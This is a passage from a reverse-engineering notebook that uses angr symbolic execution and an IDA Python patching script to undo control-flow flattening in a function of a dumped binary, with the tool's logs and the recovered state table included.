state.solver.BVV(state_2_2_eax, 32) . # Solve: state_2_1 ######################## simgr_dispatcher_2_1 = project.factory.simgr(state_2_1) stop_flag = False while True: simgr_dispatcher_2_1.step() print(simgr_dispatcher_2_1) if len(simgr_dispatcher_2_1.active) == 0: print(f&quot;Dead State!&quot;) stop_flag = True break if len(simgr_dispatcher_2_1.active) &gt; 1: print(f&quot;Multiple states: {len(simgr_dispatcher_2_1.active)}!&quot;) stop_flag = True break if simgr_dispatcher_2_1.active[0].addr == detatched_bb: print(f&quot;Found detached block: {hex(simgr_dispatcher_2_1.active[0].addr)}!&quot;) stop_flag = True break if simgr_dispatcher_2_1.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher_2_1.active[0].addr)}&quot;) if not stop_flag: state_2_1_end = simgr_dispatcher_2_1.active[0] state_2_1_bb = state_2_1_end.addr print(f&quot;state_1_eax:{hex(state_2_1_eax)} -&gt; bb: {hex(state_2_1_bb)}&quot;) print(f&quot;** Find next state(s)&quot;) # This is the start of state 3 state_3 = simgr_dispatcher_2_1.active[0] # Retrieve all potential eax values state_3_eax_values = state_3.solver.eval_upto(state_3.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_3_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(state_3_eax_values) == 1: state_3_eax_value = state_3_eax_values[0] print(f&quot;Unconditonal JMP - State eax: {hex(state_3_eax_value)}&quot;) else: for state_3_eax_value in state_3_eax_values: print(f&quot;state_3_eax:{hex(state_3_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_3.solver.eval_upto(state_3.regs.flags, 2, extra_constraints=[state_3.regs.eax == state_3_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_3_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_3_eax_value)}&quot;) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068b0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06a30 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06bbb &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067c8 &lt;SimulationManager with 1 active&gt; Found detached block: 0x7ff6c4b070d1! . # Solve: state_2_2 (good one to copy) ##################################### simgr_dispatcher_2_2 = project.factory.simgr(state_2_2) stop_flag = False while True: simgr_dispatcher_2_2.step() print(simgr_dispatcher_2_2) if len(simgr_dispatcher_2_2.active) == 0: print(f&quot;Dead State!&quot;) stop_flag = True break if len(simgr_dispatcher_2_2.active) &gt; 1: print(f&quot;Multiple states: {len(simgr_dispatcher_2_2.active)}!&quot;) stop_flag = True break if simgr_dispatcher_2_2.active[0].addr == detatched_bb: print(f&quot;Found detached block: {hex(simgr_dispatcher_2_2.active[0].addr)}!&quot;) stop_flag = True break if simgr_dispatcher_2_2.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher_2_2.active[0].addr)}&quot;) if stop_flag: print(f&quot;Stopped on bb: {hex(state_2_2_eax)}&quot;) else: state_2_2_end = simgr_dispatcher_2_2.active[0] state_2_2_bb = state_2_2_end.addr print(f&quot;state_1_eax:{hex(state_2_2_eax)} -&gt; bb: {hex(state_2_2_bb)}&quot;) print(f&quot;** Find next state(s)&quot;) # Run until dispatcher to get new state(s) ob_dead_flag = False while True: simgr_dispatcher_2_2.step() print(simgr_dispatcher_2_2) if len(simgr_dispatcher_2_2.active) == 0: print(f&quot;Dead end!&quot;) ob_dead_flag = True break if len(simgr_dispatcher_2_2.active) &gt; 1: print(f&quot;Multiple states in original bb {len(simgr_dispatcher_2_2.active)}!&quot;) ob_dead_flag = True break if simgr_dispatcher_2_2.active[0].addr == dispatcher_start: print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) if not ob_dead_flag: # This is the start of state 3 state_3_2 = simgr_dispatcher_2_2.active[0] # Retrieve all potential eax values state_3_2_eax_values = state_3_2.solver.eval_upto(state_3_2.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_3_2_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(state_3_2_eax_values) == 1: state_3_2_eax_value = state_3_2_eax_values[0] print(f&quot;Unconditonal JMP - State eax: {hex(state_3_2_eax_value)}&quot;) else: for state_3_2_eax_value in state_3_2_eax_values: print(f&quot;state_3_2_eax:{hex(state_3_2_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_3_2.solver.eval_upto(state_3_2.regs.flags, 2, extra_constraints=[state_3_2.regs.eax == state_3_2_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_3_2_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_3_2_eax_value)}&quot;) . WARNING | 2022-03-31 15:04:35,479 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068b0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068c7 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068e3 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06ce1 &lt;SimulationManager with 1 active&gt; Found original code block state_1_eax:0x173ba5e1 -&gt; bb: 0x7ff6c4b06cfd ** Find next state(s) &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b067f0 &lt;SimulationManager with 1 active&gt; Found dispatcher Number of possible state values: 1 Unconditonal JMP - State eax: 0x7a980236 . Complete Solution . import angr import claripy import struct from queue import Queue BINARY_PATH = &#39;/tmp/pandora_dump_SCY.bin&#39; # Information about the function which we can get from IDA entry_point = 0x00007FF6C4B066F0 dispatcher_start = 0x00007FF6C4B067F0 # Original code bb addresses orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] ret_bb = 0x7FF6C4B0706E orig_code_bb.append(ret_bb) detatched_bb = 0x00007FF6C4B070D1 interrupt_bb = 0x00007FF6C4B070EA project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # Start at function entrypoint initial_state = project.factory.call_state(addr=entry_point) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) simgr = project.factory.simgr(initial_state) # Explore to dispatcher start simgr.run(until=lambda s: s.active[0].addr == dispatcher_start) print(simgr.active) # Save the initial state at the dispatcher initial_dispatcher_state = simgr.active[0].copy() # Get initial state for eax eax_initial = initial_dispatcher_state.solver.eval_one(initial_dispatcher_state.regs.eax) print(f&quot;Initial state address {initial_dispatcher_state}&quot;) print(f&quot;Initial eax: {hex(eax_initial)}&quot;) def find_obb(eax_state): # # Returns the state, and the address of the obb (state,obb_address) # ** Will return NONE for obb unreachable (caller must handle this) # ** Will detached bb address if detached block found (caller must handle this) # return_state = None obb_address = None # Make a copy of the state so we can restore the original if we need state = initial_dispatcher_state.copy() # Set the eax value for the state state.regs.eax = state.solver.BVV(eax_state, 32) # Build a sim manager for our state simgr = project.factory.simgr(state) # Add danger limit for our loop danger_limit = 0 # Step until we hit a obb or we can&#39;t reach an obb while danger_limit &lt;= 10000: danger_limit += 1 simgr.step() if len(simgr.active) == 0: #print(f&quot;Dead State!&quot;) # Return nothing for dead state return None,None if len(simgr.active) &gt; 1: #print(f&quot;Multiple states: {len(simgr.active)}!&quot;) # Return nothing for branched state -- this shouldn&#39;t happen return None,None if simgr.active[0].addr == detatched_bb: #print(f&quot;Found detached block: {hex(simgr.active[0].addr)}!&quot;) # Return the return_state = None obb_address = simgr.active[0].addr return return_state, obb_address if simgr.active[0].addr in orig_code_bb: #print(f&quot;Found original code block&quot;) return simgr.active[0].copy(),simgr.active[0].addr print(f&quot;Step: {hex(simgr.active[0].addr)}&quot;) def find_dispatcher(current_state): # # Returns the next state values and associated flags [(state_value,flags)] # ** if the state is unconstrained the flags will be NONE # ** if the dispatcher is unreachable we return an empty set [] state_values = [] # Make a copy of the state so we can restore the original if we need state = current_state.copy() # Build sim manager for state simgr = project.factory.simgr(state) # Add danger limit for our loop danger_limit = 0 # Step until we hit dispatcher while danger_limit &lt;= 10000: danger_limit += 1 simgr.step() if len(simgr.active) == 0: #print(f&quot;Dead end!&quot;) return [] if len(simgr.active) &gt; 1: #print(f&quot;Multiple states in original bb {len(simgr.active)}!&quot;) return [] if simgr.active[0].addr == dispatcher_start: #print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr.active[0].addr)}&quot;) # If we got here we have some next states for the obb let&#39;s solve for them current_state= simgr.active[0] # Retrieve all potential eax values eax_values = current_state.solver.eval_upto(current_state.regs.eax, 8) #print(f&quot;Number of possible state values: {len(eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(eax_values) == 1: eax_value = eax_values[0] #print(f&quot;Unconditonal JMP - State eax: {hex(eax_value)}&quot;) state_values.append((eax_value,None)) else: for eax_value in eax_values: #print(f&quot;eax_value:{hex(eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = current_state.solver.eval_upto(current_state.regs.flags, 2, extra_constraints=[current_state.regs.eax == eax_value]) # if len(flags_values) == 1: # This is the constrained state we must save these flags with the state #print(f&quot;Constrained state: {hex(eax_value)}&quot;) flags = flags_values[0] state_values.append((eax_value,flags)) # else: # # This is the unconstrained state, we don&#39;t need to save anything # #print(f&quot;Unconstrained state: {hex(eax_value)}&quot;) # state_values.append((eax_value,None)) return state_values def get_state_info(state_value): # (obb_address, [(state,flags)]) obb_state,obb_address = find_obb(state_value) # Check if we hit a dead state if obb_address == None: print(f&quot;Dead state: {hex(state_value)}&quot;) return None # Check if we a detached bb elif obb_address == detatched_bb: print(f&quot;Detached BB: State:{hex(state_value)} -&gt; bb: {hex(obb_address)}&quot;) return (obb_address, []) else: print(f&quot;State:{hex(state_value)} -&gt; bb: {hex(obb_address)}&quot;) # Find next states next_states = find_dispatcher(obb_state) # Check if end code block (no path to dispatcher) if len(next_states) == 0: print(f&quot;{hex(obb_address)} is end state!&quot;) return (obb_address, []) # Check if this is an unconditional jmp elif len(next_states) == 1: print(f&quot;{hex(obb_address)} -&gt; jmp state:{hex(next_states[0][0])}&quot;) return (obb_address, next_states) # If there are multiple states print the conditions else: for next_state in next_states: if next_state[1] == None: # This is unconditional jmp print(f&quot;{hex(obb_address)} -&gt; jmp state:{hex(next_state[0])}&quot;) else: # This is a conditional jmp print(f&quot;{hex(obb_address)} -&gt; conditional jmp state:{hex(next_state[0])}&quot;) return (obb_address, next_states) # state_table[state] = (obb_address, [(state,flags)]) state_table = {} q = Queue() q.put(eax_initial) while not q.empty(): state_value = q.get() state_info = get_state_info(state_value) if state_info is not None: state_table[state_value] = state_info # If we have a new state add it to the queue for next_state in state_info[1]: next_state_value = next_state[0] if next_state_value not in state_table: q.put(next_state_value) . WARNING | 2022-03-31 17:31:51,900 | angr.calling_conventions | Guessing call prototype. Please specify prototype. WARNING | 2022-03-31 17:31:51,910 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 17:31:51,912 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 17:31:51,914 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 17:31:51,916 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 17:31:51,917 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 17:31:51,919 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 17:31:51,920 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 17:31:51,921 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) WARNING | 2022-03-31 17:31:51,995 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:52,102 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . [&lt;SimState @ 0x7ff6c4b067f0&gt;] Initial state address &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06847 Step: 0x7ff6c4b06863 State:0x8cbc0434 -&gt; bb: 0x7ff6c4b0687f 0x7ff6c4b0687f -&gt; conditional jmp state:0x7d9d86f3 0x7ff6c4b0687f -&gt; conditional jmp state:0x173ba5e1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06bbb Step: 0x7ff6c4b067c8 Detached BB: State:0x7d9d86f3 -&gt; bb: 0x7ff6c4b070d1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b068e3 Step: 0x7ff6c4b06ce1 State:0x173ba5e1 -&gt; bb: 0x7ff6c4b06cfd Step: 0x7ff6c4b06d2e Step: 0x7ff6c4b06d54 Step: 0x7ff6c4b06d67 Step: 0x7ff6c4b06d7a Step: 0x7ff6c4b06d95 Step: 0x7ff6c4b06da8 Step: 0x7ff6c4b06dd5 Step: 0x7ff6c4b06df2 Step: 0x7ff6c4b06e05 Step: 0x7ff6c4b06e20 Step: 0x7ff6c4b06e33 . WARNING | 2022-03-31 17:31:52,166 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff60 with 8 unconstrained bytes referenced from 0x7ff6c4b06ef8 (offset 0x6ef8 in pandora_dump_SCY.bin (0x7ff6c4b06ef8)) WARNING | 2022-03-31 17:31:52,200 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:52,265 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b0694d (offset 0x694d in pandora_dump_SCY.bin (0x7ff6c4b0694d)) WARNING | 2022-03-31 17:31:52,266 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff40 with 8 unconstrained bytes referenced from 0x7ff6c4b06952 (offset 0x6952 in pandora_dump_SCY.bin (0x7ff6c4b06952)) . Step: 0x7ff6c4b06e57 0x7ff6c4b06cfd -&gt; jmp state:0x7a980236 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06a4c Step: 0x7ff6c4b06edc State:0x7a980236 -&gt; bb: 0x7ff6c4b06ef8 0x7ff6c4b06ef8 -&gt; conditional jmp state:0x10bc6c78 0x7ff6c4b06ef8 -&gt; conditional jmp state:0xa22a16af Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b068e3 Step: 0x7ff6c4b068ff State:0x10bc6c78 -&gt; bb: 0x7ff6c4b0691a Step: 0x7ff6c4b0694d . WARNING | 2022-03-31 17:31:52,703 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff34 with 4 unconstrained bytes referenced from 0x7ff6c4b06c61 (offset 0x6c61 in pandora_dump_SCY.bin (0x7ff6c4b06c61)) WARNING | 2022-03-31 17:31:52,755 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) . Step: 0x7ff6c4b06976 Step: 0x7ff6c4b06992 0x7ff6c4b0691a -&gt; jmp state:0x7a980236 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06847 Step: 0x7ff6c4b06c45 State:0xa22a16af -&gt; bb: 0x7ff6c4b06c61 Step: 0x7ff6c4b06c85 Step: 0x7ff6c4b06ca6 Step: 0x7ff6c4b06cb9 0x7ff6c4b06c61 -&gt; conditional jmp state:0x3cd69d30 0x7ff6c4b06c61 -&gt; conditional jmp state:0x7d71a1e3 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 Step: 0x7ff6c4b06b09 Step: 0x7ff6c4b07008 . WARNING | 2022-03-31 17:31:52,813 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff38 with 4 unconstrained bytes referenced from 0x7ff6c4b07045 (offset 0x7045 in pandora_dump_SCY.bin (0x7ff6c4b07045)) WARNING | 2022-03-31 17:31:52,845 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b06c1c (offset 0x6c1c in pandora_dump_SCY.bin (0x7ff6c4b06c1c)) WARNING | 2022-03-31 17:31:52,880 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff2c with 4 unconstrained bytes referenced from 0x7ff6c4b06a04 (offset 0x6a04 in pandora_dump_SCY.bin (0x7ff6c4b06a04)) WARNING | 2022-03-31 17:31:52,883 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 17:31:52,886 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) . State:0x3cd69d30 -&gt; bb: 0x7ff6c4b07024 0x7ff6c4b07024 -&gt; jmp state:0xc30bae2e Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06bbb Step: 0x7ff6c4b06bd7 State:0x7d71a1e3 -&gt; bb: 0x7ff6c4b06bf3 Step: 0x7ff6c4b06c0f Step: 0x7ff6c4b06c40 Step: 0x7ff6c4b06ecc 0x7ff6c4b06bf3 -&gt; jmp state:0xa2992627 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b069cc Step: 0x7ff6c4b069e8 State:0xc30bae2e -&gt; bb: 0x7ff6c4b06a04 0x7ff6c4b06a04 -&gt; conditional jmp state:0x6c249751 0x7ff6c4b06a04 -&gt; conditional jmp state:0x3b2b8a1e Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06a99 Step: 0x7ff6c4b06ab5 State:0xa2992627 -&gt; bb: 0x7ff6c4b06ad1 0x7ff6c4b06ad1 -&gt; jmp state:0xecce8ff1 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b06a30 Step: 0x7ff6c4b06a4c Step: 0x7ff6c4b06a68 State:0x6c249751 -&gt; bb: 0x7ff6c4b06a84 0x7ff6c4b06a84 -&gt; jmp state:0x7d71a1e3 Step: 0x7ff6c4b068b0 Step: 0x7ff6c4b068c7 . WARNING | 2022-03-31 17:31:53,034 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff3c with 4 unconstrained bytes referenced from 0x7ff6c4b06b3b (offset 0x6b3b in pandora_dump_SCY.bin (0x7ff6c4b06b3b)) WARNING | 2022-03-31 17:31:53,067 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) WARNING | 2022-03-31 17:31:53,118 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff78 with 8 unconstrained bytes referenced from 0x7ff6c4b0706e (offset 0x706e in pandora_dump_SCY.bin (0x7ff6c4b0706e)) WARNING | 2022-03-31 17:31:53,160 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06b9f (offset 0x6b9f in pandora_dump_SCY.bin (0x7ff6c4b06b9f)) . Step: 0x7ff6c4b06b09 Step: 0x7ff6c4b06b20 State:0x3b2b8a1e -&gt; bb: 0x7ff6c4b06b3b 0x7ff6c4b06b3b -&gt; conditional jmp state:0xd43fb344 0x7ff6c4b06b3b -&gt; conditional jmp state:0xc094d6c9 Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b06b63 Step: 0x7ff6c4b07052 State:0xecce8ff1 -&gt; bb: 0x7ff6c4b0706e Step: 0x7ff6c4b07090 Step: 0x7ff6c4b070ae Step: 0xffed89901000 0x7ff6c4b0706e is end state! Step: 0x7ff6c4b06819 Step: 0x7ff6c4b069b0 Step: 0x7ff6c4b06b63 Step: 0x7ff6c4b06b7f State:0xd43fb344 -&gt; bb: 0x7ff6c4b06b9b 0x7ff6c4b06b9b -&gt; jmp state:0xc30bae2e Step: 0x7ff6c4b06819 Step: 0x7ff6c4b06830 Step: 0x7ff6c4b06a99 Step: 0x7ff6c4b06f3d State:0xc094d6c9 -&gt; bb: 0x7ff6c4b06f58 Step: 0x7ff6c4b06f70 . WARNING | 2022-03-31 17:31:53,486 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff58 with 8 unconstrained bytes referenced from 0x7ff6c4b06f7e (offset 0x6f7e in pandora_dump_SCY.bin (0x7ff6c4b06f7e)) . Step: 0x7ff6c4b06f9f Step: 0x7ff6c4b06fc9 Step: 0x7ff6c4b06ff8 0x7ff6c4b06f58 -&gt; jmp state:0xd43fb344 . state_table . {2361132084: (140697838577791, [(2107475699, 0), (389785057, 68)]), 2107475699: (140697838579921, []), 389785057: (140697838578941, [(2056782390, None)]), 2056782390: (140697838579448, [(280783992, 149), (2720667311, 148)]), 280783992: (140697838577946, [(2056782390, None)]), 2720667311: (140697838578785, [(1020697904, 0), (2104599011, 68)]), 1020697904: (140697838579748, [(3272322606, None)]), 2104599011: (140697838578675, [(2727945767, None)]), 3272322606: (140697838578180, [(1814337361, 148), (992709150, 149)]), 2727945767: (140697838578385, [(3972960241, None)]), 1814337361: (140697838578308, [(2104599011, None)]), 992709150: (140697838578491, [(3560944452, 68), (3230979785, 0)]), 3972960241: (140697838579822, []), 3560944452: (140697838578587, [(3272322606, None)]), 3230979785: (140697838579544, [(3560944452, None)])} . Build Patching Script in IDA Python . For each obb look up the state_info . if not conditional jmp then patch last bytes in obb with jmp -&gt; state (lookup state address) | if conditional then read in the last few bytes of the obb and try to determin the condition compare the condition with the saved flags for each state | add one conditional jmp based on the flags | add one unconditional jmp for the other state | . | . class Flags: def __init__(self, register): self.CF = False self.PF = False self.AF = False self.ZF = False self.SF = False self.TF = False self.IF = False self.DF = False self.OF = False if register &amp; 0x0001 == 0x0001: self.CF = True if register &amp; 0x0004 == 0x0004: self.PF = True if register &amp; 0x0010 == 0x0010: self.AF = True if register &amp; 0x0040 == 0x0040: self.ZF = True if register &amp; 0x0080 == 0x0080: self.SF = True if register &amp; 0x0100 == 0x0100: self.TF = True if register &amp; 0x0200 == 0x0200: self.IF = True if register &amp; 0x0400 == 0x0400: self.DF = True if register &amp; 0x0800 == 0x0800: self.OF = True state_table = {2361132084: (140697838577791, [(2107475699, 0), (389785057, 68)]), 2107475699: (140697838579921, []), 389785057: (140697838578941, [(2056782390, None)]), 2056782390: (140697838579448, [(280783992, 149), (2720667311, 148)]), 280783992: (140697838577946, [(2056782390, None)]), 2720667311: (140697838578785, [(1020697904, 0), (2104599011, 68)]), 1020697904: (140697838579748, [(3272322606, None)]), 2104599011: (140697838578675, [(2727945767, None)]), 3272322606: (140697838578180, [(1814337361, 148), (992709150, 149)]), 2727945767: (140697838578385, [(3972960241, None)]), 1814337361: (140697838578308, [(2104599011, None)]), 992709150: (140697838578491, [(3560944452, 68), (3230979785, 0)]), 3972960241: (140697838579822, []), 3560944452: (140697838578587, [(3272322606, None)]), 3230979785: (140697838579544, [(3560944452, None)])} orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] entry_point = 0x00007FF6C4B066F0 ret_bb = 0x7FF6C4B0706E detatched_bb = 0x00007FF6C4B070D1 # Add these blocks so we test them as well orig_code_bb.append(entry_point) orig_code_bb.append(ret_bb) orig_code_bb.append(detatched_bb) # we also need to fake an initial block so that the entrypoint has some state info # We know that it jumps to the initial state so just add it manually # Initial eax: 0x8cbc0434 state_table[0xffff] = (0x00007FF6C4B066F0, [0x8cbc0434, None]) for obb_addr in orig_code_bb: for state in state_table: state_info = state_table[state] if obb_addr == state_info[0]: # Found the obb info if len(state_info[1]) == 0: # This is an end state do nothing break elif len(state_info[1]) == 1: # Unconditional jmp # Determine next_obb address from next_state next_state = state_info[1][0][0] next_obb_address = state_table[next_state][0] # Iterate through obb until we hit the jmp # replace it with the new state obb address ptr = obb_addr while print_insn_mnem(ptr) != &#39;jmp&#39;: ptr = next_head(ptr) jmp_rel = next_obb_address - (ptr + 5) patch_jmp = b&#39; xe9&#39; + struct.pack(&#39;&lt;i&#39;,jmp_rel) #print(f&quot;Unconditional patch {patch_jmp} at {hex(ptr)}&quot;) # Patch bytes ida_bytes.patch_bytes(ptr,patch_jmp) break else: # Conditional jmp print(f&quot;obb: {hex(obb_addr)}&quot;) ptr = obb_addr conditional_jmp_instruction = None conditional_jmp_address = None unconditional_jmp_address = None while print_insn_mnem(ptr) != &#39;jmp&#39;: instruction = print_insn_mnem(ptr) if &quot;cmovnz&quot; == instruction: # Use a JNZ (ZF=0) # Check the flags for both next states # Make sure on one flag set 